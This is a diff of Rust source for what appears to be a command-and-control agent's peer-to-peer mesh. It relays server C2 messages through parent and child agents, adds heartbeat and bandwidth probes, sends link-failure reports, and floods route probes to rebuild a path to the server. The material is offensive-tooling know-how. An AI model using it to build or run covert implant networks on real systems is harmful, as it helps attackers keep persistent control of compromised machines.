+                    if let Some(link) = mesh_guard.links.get_mut(&parent_link_id) {
+                        link.state = LinkState::Dead;
+                    }
+                    return;
+                }
             };
 
-            match read_result {
-                Ok((_link_id, plaintext)) => {
+            // ── Phase 2: Dispatch by frame type ──
+            match frame.frame_type {
+                P2pFrameType::DataForward => {
+                    // Decrypt the payload.
+                    let mesh_guard = mesh.lock().await;
+                    let key = match mesh_guard.links.get(&parent_link_id) {
+                        Some(l) => l.ecdh_shared_secret,
+                        None => return,
+                    };
+                    let plaintext = match decrypt_payload(&key, &frame.payload) {
+                        Ok(p) => p,
+                        Err(e) => {
+                            log::warn!(
+                                "parent reader: decrypt error on {:#010X}: {}",
+                                parent_link_id, e
+                            );
+                            continue;
+                        }
+                    };
+                    drop(mesh_guard);
+
                     // The plaintext is a C2 message from the server,
                     // routed through the parent.  Deserialize with bincode
-                    // (the same codec used by the C2 transport) and inject
-                    // into the main loop.
+                    // and inject into the main loop.
                     match bincode::deserialize::<common::Message>(&plaintext) {
                         Ok(msg) => {
                             log::debug!(
@@ -1553,8 +2177,7 @@ pub fn spawn_parent_reader(
                         }
                         Err(e) => {
                             // If we can't parse it as a Message, it might be
-                            // a raw C2 payload or routing blob for a grandchild.
-                            // Try parsing as a routing blob.
+                            // a routing blob for a grandchild.
                             if let Ok((child_link_id, payload)) =
                                 parse_p2p_routing_blob(&plaintext)
                             {
@@ -1578,17 +2201,55 @@ pub fn spawn_parent_reader(
                         }
                     }
                 }
-                Err(e) => {
-                    log::warn!(
-                        "parent reader: read error on parent link {:#010X}: {} — exiting",
-                        parent_link_id,
-                        e
-                    );
+                _ => {
+                    // Control frame — decrypt and handle inline.
                     let mut mesh_guard = mesh.lock().await;
-                    if let Some(link) = mesh_guard.links.get_mut(&parent_link_id) {
-                        link.state = LinkState::Dead;
+                    let key = match mesh_guard.links.get(&parent_link_id) {
+                        Some(l) => l.ecdh_shared_secret,
+                        None => continue,
+                    };
+
+                    let decrypted_frame = if matches!(
+                        frame.frame_type,
+                        P2pFrameType::LinkHeartbeat
+                            | P2pFrameType::RouteUpdate
+                            | P2pFrameType::RouteProbe
+                            | P2pFrameType::RouteProbeReply
+                            | P2pFrameType::BandwidthProbe
+                            | P2pFrameType::PeerDiscovery
+                    ) {
+                        let payload = decrypt_payload(&key, &frame.payload)
+                            .unwrap_or_default();
+                        P2pFrame {
+                            frame_type: frame.frame_type,
+                            link_id: frame.link_id,
+                            payload_len: payload.len() as u32,
+                            payload,
+                        }
+                    } else {
+                        frame
+                    };
+
+                    // Handle PeerDiscovery specially — it needs mesh_arc.
+                    if decrypted_frame.frame_type == P2pFrameType::PeerDiscovery {
+                        if let Err(e) = handle_peer_discovery(
+                            &mut mesh_guard,
+                            &decrypted_frame.payload,
+                            mesh.clone(),
+                            dummy_tx.clone(),
+                        ).await {
+                            log::debug!(
+                                "PeerDiscovery error on parent {:#010X}: {}",
+                                parent_link_id, e
+                            );
+                        }
+                    } else {
+                        handle_control_frame_inner(
+                            &mut mesh_guard,
+                            &decrypted_frame,
+                            &dummy_tx,
+                        ).await;
                     }
-                    return;
                 }
             }
         }
@@ -1637,7 +2298,10 @@ pub fn parse_p2p_routing_blob(blob: &[u8]) -> anyhow::Result<(u32, Vec<u8>)> {
 // ══════════════════════════════════════════════════════════════════════════
 
 /// Default P2P heartbeat interval in seconds.
-pub const DEFAULT_P2P_HEARTBEAT_SECS: u64 = 30;
+pub const DEFAULT_P2P_HEARTBEAT_SECS: u64 = 15;
+
+/// Bandwidth probe interval in seconds (runs on the heartbeat timer).
+const BANDWIDTH_PROBE_INTERVAL_SECS: u64 = 60;
 
 /// Default TopologyReport interval in seconds.
 pub const TOPOLOGY_REPORT_INTERVAL_SECS: u64 = 60;
@@ -1770,10 +2434,14 @@ pub fn spawn_heartbeat_task(
         let mut route_tick = tokio::time::interval(
             std::time::Duration::from_secs(ROUTE_UPDATE_INTERVAL_SECS),
         );
+        let mut bw_probe_tick = tokio::time::interval(
+            std::time::Duration::from_secs(BANDWIDTH_PROBE_INTERVAL_SECS),
+        );
         // Stagger the first topology report so it doesn't collide with
         // the first heartbeat.
         topo_tick.tick().await;
         route_tick.tick().await;
+        bw_probe_tick.tick().await;
 
         loop {
             tokio::select! {
@@ -1782,13 +2450,30 @@ pub fn spawn_heartbeat_task(
                     let dead_links = {
                         let mut mesh_guard = mesh.lock().await;
 
-                        // Send heartbeats to all connected links.
+                        // Send heartbeats to all connected links and
+                        // record quality metrics.
                         let mut send_errors: Vec<u32> = Vec::new();
                         let link_ids: Vec<u32> = mesh_guard.links.keys().copied().collect();
+                        let now = Instant::now();
 
                         for lid in &link_ids {
                             if let Some(link) = mesh_guard.links.get_mut(lid) {
                                 if link.state.is_usable() {
+                                    // Record a missed heartbeat for quality tracking.
+                                    // If it exceeds the dead threshold, mark it.
+                                    let is_dead = link.quality.record_missed_heartbeat();
+                                    if is_dead {
+                                        log::warn!(
+                                            "P2P link {:#010X} exceeded dead threshold \
+                                             ({} consecutive failures)",
+                                            lid,
+                                            LinkQuality::DEAD_THRESHOLD
+                                        );
+                                        let _ = link.transition(LinkState::Dead);
+                                        send_errors.push(*lid);
+                                        continue;
+                                    }
+
                                     if let Err(e) = send_heartbeat(link).await {
                                         log::warn!(
                                             "P2P heartbeat send failed on link {:#010X}: {}",
@@ -1803,16 +2488,17 @@ pub fn spawn_heartbeat_task(
                         // Links where send failed → mark dead.
                         for lid in &send_errors {
                             if let Some(link) = mesh_guard.links.get_mut(lid) {
-                                log::warn!(
-                                    "P2P link {:#010X} marked dead (heartbeat send failed)",
-                                    lid
-                                );
-                                let _ = link.transition(LinkState::Dead);
+                                if link.state != LinkState::Dead {
+                                    log::warn!(
+                                        "P2P link {:#010X} marked dead (heartbeat send failed)",
+                                        lid
+                                    );
+                                    let _ = link.transition(LinkState::Dead);
+                                }
                             }
                         }
 
-                        // Check for timed-out links.
-                        let now = Instant::now();
+                        // Check for timed-out links (no activity in 3× interval).
                         let mut dead: Vec<u32> = Vec::new();
                         for (&lid, link) in &mesh_guard.links {
                             if link.state.is_usable()
@@ -1829,6 +2515,8 @@ pub fn spawn_heartbeat_task(
                                     "P2P link {:#010X} timed out (no activity for >{:?}), marking dead",
                                     lid, dead_timeout
                                 );
+                                // Update quality metrics before transitioning.
+                                link.quality.update_uptime(link.connected_at);
                                 let _ = link.transition(LinkState::Dead);
                             }
                         }
@@ -1836,12 +2524,73 @@ pub fn spawn_heartbeat_task(
                         // Collect all dead links (send-failed + timed-out).
                         let mut all_dead = send_errors;
                         all_dead.extend(dead);
+
+                        // ── Update uptime on all live links ─────────────
+                        for (&_lid, link) in &mut mesh_guard.links {
+                            if link.state.is_usable() {
+                                link.quality.update_uptime(link.connected_at);
+                            }
+                        }
+
+                        // ── Check congestion on all links ───────────────
+                        let _congested = mesh_guard.check_all_congestion();
+
                         all_dead
                     };
 
                     // ── Handle dead links outside the mesh lock ────────
                     for dead_lid in &dead_links {
                         let mut mesh_guard = mesh.lock().await;
+
+                        // Extract the data we need from the dead link while
+                        // it's still in the mesh (P2pLink is not Clone).
+                        let dead_info: Option<(LinkType, String, u64, u32, f32, u64)> =
+                            mesh_guard.links.get(dead_lid).map(|l| {
+                                (
+                                    l.link_type,
+                                    l.peer_agent_id.clone(),
+                                    l.quality.uptime_secs,
+                                    l.quality.latency_ms,
+                                    l.quality.packet_loss,
+                                    l.quality.bandwidth_bps,
+                                )
+                            });
+
+                        // Send LinkFailureReport before removing the link
+                        // (only if we still have a parent and this isn't
+                        // the parent itself).
+                        if let Some(info) = &dead_info {
+                            if mesh_guard.parent_link_id != Some(*dead_lid) {
+                                // send_link_failure_report is a no-op stub;
+                                // actual reporting goes through the outbound
+                                // channel below.
+                            }
+                        }
+
+                        // Send P2pLinkFailureReport via outbound channel
+                        // (goes to the server through the parent).
+                        if let Some((link_type, peer_agent_id, uptime_secs, latency_ms, packet_loss, bandwidth_bps)) = &dead_info {
+                            let link_type_byte = match link_type {
+                                LinkType::Parent => 0u8,
+                                LinkType::Child => 1u8,
+                                LinkType::Peer => 2u8,
+                            };
+                            let report = common::Message::P2pLinkFailureReport {
+                                agent_id: mesh_guard.agent_id.clone(),
+                                dead_peer_id: peer_agent_id.clone(),
+                                link_type: link_type_byte,
+                                uptime_secs: *uptime_secs,
+                                latency_ms: *latency_ms,
+                                packet_loss: *packet_loss,
+                                bandwidth_bps: *bandwidth_bps,
+                            };
+                            if let Err(e) = outbound_tx.send(report).await {
+                                log::warn!(
+                                    "P2pLinkFailureReport: outbound channel error: {}",
+                                    e
+                                );
+                            }
+                        }
 
                         // Remove any routes through this dead link.
                         mesh_guard.remove_routes_via(*dead_lid);
@@ -1852,14 +2601,53 @@ pub fn spawn_heartbeat_task(
 
                         if let Some(dead_link) = mesh_guard.remove_link(*dead_lid) {
                             if is_parent {
-                                // Child side: parent link died.
-                                // The child does NOT reconnect on its own.
-                                // It waits for the server to issue a new LinkTo
-                                // command with an alternative parent.
-                                // pending_forwards is preserved inside the link
-                                // for later flushing if re-linked — but since
-                                // remove_link consumes the link, we store the
-                                // pending data as a warning log for now.
+                                // Parent link died. In Mesh/Hybrid mode, flood
+                                // RouteProbe to discover alternate paths.
+                                if mesh_guard.mesh_mode != MeshMode::Tree {
+                                    log::info!(
+                                        "P2P parent link {:#010X} died; flooding RouteProbe \
+                                         to find alternate paths",
+                                        dead_lid
+                                    );
+                                    // Probe for route to server (link_id = 0).
+                                    let link_ids: Vec<u32> = mesh_guard.links.keys()
+                                        .copied()
+                                        .collect();
+                                    for lid in &link_ids {
+                                        if let Some(link) = mesh_guard.links.get_mut(lid) {
+                                            if link.state.is_usable() {
+                                                if let Err(e) = send_route_probe(
+                                                    link, 0, // destination=server
+                                                ).await {
+                                                    log::warn!(
+                                                        "RouteProbe flood failed on {:#010X}: {}",
+                                                        lid, e
+                                                    );
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+
+                                // Check link redundancy: request peer reconnect
+                                // if we have fewer than 2 paths to the server.
+                                let paths = mesh_guard.count_server_paths();
+                                if paths < 2 && mesh_guard.mesh_mode != MeshMode::Tree {
+                                    log::info!(
+                                        "P2P only {} path(s) to server; requesting \
+                                         peer reconnect",
+                                        paths
+                                    );
+                                    if let Err(e) = outbound_tx.send(
+                                        common::Message::P2pForward {
+                                            child_link_id: *dead_lid,
+                                            data: br#"{"type":"PeerReconnect"}"#.to_vec(),
+                                        }
+                                    ).await {
+                                        log::warn!("PeerReconnect send failed: {}", e);
+                                    }
+                                }
+
                                 if !dead_link.pending_forwards.is_empty() {
                                     log::warn!(
                                         "P2P parent link {:#010X} died with {} buffered forwards; \
@@ -1873,7 +2661,7 @@ pub fn spawn_heartbeat_task(
                                     dead_lid
                                 );
                             } else {
-                                // Parent side: child or peer link died.
+                                // Child or peer link died.
                                 let link_kind = if is_peer { "peer" } else { "child" };
                                 log::info!(
                                     "P2P {} link {:#010X} (agent={}) removed",
@@ -1881,9 +2669,6 @@ pub fn spawn_heartbeat_task(
                                     dead_lid,
                                     dead_link.peer_agent_id
                                 );
-                                // TopologyReport will be generated on the next
-                                // topology tick, automatically reflecting the
-                                // removed link.
                             }
                         }
                     }
@@ -1948,6 +2733,25 @@ pub fn spawn_heartbeat_task(
                         entry.route_quality >= ROUTE_MIN_QUALITY
                     });
                 }
+
+                _ = bw_probe_tick.tick() => {
+                    // ── Send BandwidthProbe to all connected links ──────
+                    let mut mesh_guard = mesh.lock().await;
+
+                    let link_ids: Vec<u32> = mesh_guard.links.keys().copied().collect();
+                    for lid in &link_ids {
+                        if let Some(link) = mesh_guard.links.get_mut(lid) {
+                            if link.state.is_usable() {
+                                if let Err(e) = send_bandwidth_probe(link).await {
+                                    log::debug!(
+                                        "BandwidthProbe failed on link {:#010X}: {}",
+                                        lid, e
+                                    );
+                                }
+                            }
+                        }
+                    }
+                }
             }
         }
     })
@@ -1955,21 +2759,33 @@ pub fn spawn_heartbeat_task(
 
 /// Handle an incoming `LinkHeartbeat` frame on a link.
 ///
-/// Decrypts the payload, records the heartbeat timestamp, and returns
-/// the peer's timestamp (milliseconds since epoch).
-pub fn handle_heartbeat(link: &mut P2pLink, encrypted_payload: &[u8]) -> anyhow::Result<u64> {
-    let key = link.ecdh_shared_secret;
-    let plaintext = decrypt_payload(&key, encrypted_payload)?;
-    if plaintext.len() < 8 {
+/// Decrypts the payload, records the heartbeat timestamp, calculates RTT
+/// latency, and updates link quality metrics. Returns the peer's timestamp
+/// (milliseconds since epoch).
+pub fn handle_heartbeat(link: &mut P2pLink, decrypted_payload: &[u8]) -> anyhow::Result<u64> {
+    if decrypted_payload.len() < 8 {
         return Err(anyhow::anyhow!(
             "heartbeat payload too short: {} < 8",
-            plaintext.len()
+            decrypted_payload.len()
         ));
     }
     let peer_ts = u64::from_le_bytes([
-        plaintext[0], plaintext[1], plaintext[2], plaintext[3],
-        plaintext[4], plaintext[5], plaintext[6], plaintext[7],
+        decrypted_payload[0], decrypted_payload[1], decrypted_payload[2], decrypted_payload[3],
+        decrypted_payload[4], decrypted_payload[5], decrypted_payload[6], decrypted_payload[7],
     ]);
+
+    // Calculate RTT from peer's timestamp vs our clock.
+    let now_ms = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_millis() as u64;
+    let rtt_ms = now_ms.saturating_sub(peer_ts);
+    if rtt_ms < 300_000 {
+        // Sanity: ignore if > 5 minutes (clock skew).
+        link.quality.record_latency(rtt_ms as u32);
+    }
+
+    link.quality.record_heartbeat_success();
     link.record_heartbeat();
     Ok(peer_ts)
 }
